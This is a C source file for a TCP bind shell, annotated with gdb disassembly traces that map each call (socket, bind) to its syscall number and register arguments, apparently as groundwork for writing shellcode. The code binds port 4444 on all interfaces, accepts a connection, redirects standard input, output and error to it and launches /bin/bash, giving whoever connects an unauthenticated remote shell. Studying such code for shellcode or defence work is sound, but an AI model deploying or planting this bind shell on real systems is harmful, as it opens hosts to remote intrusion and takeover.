#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdlib.h>



int main(void)
{
	int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
/*  0x5555555551ad <main+8>:     mov    edx,0x0
    0x5555555551b2 <main+13>:    mov    esi,0x1
    0x5555555551b7 <main+18>:    mov    edi,0x2
    0x5555555551bc <main+23>:    call   0x5555555550a0 <socket@plt>
 => 0x7ffff7edf8d0 <socket>:     mov    eax,0x29
    0x7ffff7edf8d5 <socket+5>:   syscall
    0x7ffff7edf8d7 <socket+7>:   cmp    rax,0xfffffffffffff001
    0x7ffff7edf8dd <socket+13>:  jae    0x7ffff7edf8e0 <socket+16>
    0x7ffff7edf8df <socket+15>:  ret

    RAX = 0x29 = Syscall-Socket
    int socket(int domain, int type, int protocol);
    RDI = 0x2  = domain   = AF_INET     = IPv4 Address Family
    RSI = 0x1  = type     = SOCK_STREAM = TCP
    RDX = 0x0  = protocol = IP          = internet protocol - /etc/protocols
    RAX-Returns = 0x3 = File-Descriptor for Socket
    
*/
	
	struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };
/*  0x5555555551c1 <main+28>:    mov    DWORD PTR [rbp-0x4],eax
    0x5555555551c4 <main+31>:    mov    QWORD PTR [rbp-0x20],0x0
 => 0x5555555551cc <main+39>:    mov    QWORD PTR [rbp-0x18],0x0
    0x5555555551d4 <main+47>:    mov    WORD PTR [rbp-0x20],0x2
    0x5555555551da <main+53>:    mov    edi,0x115c
    0x5555555551df <main+58>:    call   0x555555555030 <htons@plt>
*/

	bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); 
/*
    0x5555555551fc <main+87>:    mov    edx,0x10
    0x555555555201 <main+92>:    mov    rsi,rcx
    0x555555555204 <main+95>:    mov    edi,eax
 => 0x555555555206 <main+97>:    call   0x555555555080 <bind@plt>

    RAX = 0x31 = Syscall-Bind
    RDI = 0x3  = File-Descriptor for Socket
    RSI = 0x7fffffffe110 --> 0x5c110002 
    RDX = 0x10

*/

	listen(ipv4Socket, 0);

	int clientSocket = accept(ipv4Socket, NULL, NULL);

	dup2(clientSocket, 0);
	dup2(clientSocket, 1);
	dup2(clientSocket, 2);
	
	execve("/bin/bash", NULL, NULL);

}	
